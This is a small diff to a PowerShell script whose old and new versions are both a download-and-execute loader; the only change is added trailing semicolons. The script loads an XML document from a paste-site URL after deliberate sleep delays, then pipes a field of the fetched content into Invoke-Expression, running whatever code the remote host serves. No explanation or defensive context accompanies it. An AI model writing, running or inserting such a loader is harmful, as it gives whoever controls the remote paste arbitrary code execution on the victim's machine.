@@ -1,5 +1,5 @@
-$fawq = New-Object System.Xml.XmlDocument
-start-sleep -s 10
-$fawq.Load("https://0paste.com/348802-0036aaf3.txt")
-start-sleep -s 12
-$fawq.command.a.execute | iex
+$fawq = New-Object System.Xml.XmlDocument;
+start-sleep -s 10;
+$fawq.Load("https://0paste.com/348802-0036aaf3.txt");
+start-sleep -s 12;
+$fawq.command.a.execute | iex;
